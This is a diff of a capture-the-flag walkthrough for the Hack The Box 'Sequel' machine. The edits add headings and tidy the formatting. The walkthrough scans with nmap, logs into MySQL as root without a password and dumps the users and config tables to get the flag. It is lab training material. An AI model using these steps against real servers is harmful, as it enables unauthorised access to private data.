@@ -3,6 +3,12 @@ layout: default
 title: Sequel
 ---
 
+## TL;DR
+
+We see port 3306 is open, so there is `mysql` server. We login using root username and no password, and find the flag.
+
+### Recon
+
 we start with `nmap`, using this command, i didn't use `-p-` and also `-sV`, because it takes to much time, used only `-sC` :
 ```bash
 nmap -sC --min-rate=10000 $target
@@ -12,7 +18,7 @@ nmap -sC --min-rate=10000 $target
 
 As you can see, port `3306`, which has *mysql* service, is opened.
 
-```
+```bash
 PORT     STATE SERVICE
 3306/tcp open  mysql
 | mysql-info: 
@@ -26,6 +32,8 @@ PORT     STATE SERVICE
 |_  Auth Plugin Name: mysql_native_password
 ```
 
+### Connect to mysql server using root user and no password and find password
+
 We try to connect to the *mysql* using `root` username, and hope we won't need to provide password, `-h` stands for host, `-u` is username, `-P` is port, and i also disabled the verification of the ssl, because it causes problems:
 ```bash
 mysql -h $target -u root -P 3306 --skip-ssl-verify-server-cert
@@ -33,8 +41,8 @@ mysql -h $target -u root -P 3306 --skip-ssl-verify-server-cert
 
 ![mysql](image.png)
 
-Okay, so first let's view the databased using `show databases;`
-```
+Okay, so first let's view the database using `show databases;`
+```bash
 MariaDB [(none)]> show databases;
 +--------------------+
 | Database           |
@@ -48,7 +56,7 @@ MariaDB [(none)]> show databases;
 ```
 
 Now, let's use `htb` table, using `use htb;`, and then show the tables in this database, using `show tables;`
-```
+```bash
 MariaDB [(none)]> use htb;
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
@@ -65,7 +73,7 @@ MariaDB [htb]> show tables;
 ```
 
 Okay, now we want to fetch all the data from `users` table, using `select * from users;`:
-```
+```bash
 MariaDB [htb]> select * from users;
 +----+----------+------------------+
 | id | username | email            |
@@ -79,7 +87,7 @@ MariaDB [htb]> select * from users;
 ```
 
 The flag isn't here, so let's fetch the data from `config` table, using `select * from config;`:
-```
+```bash
 +----+-----------------------+----------------------------------+
 | id | name                  | value                            |
 +----+-----------------------+----------------------------------+
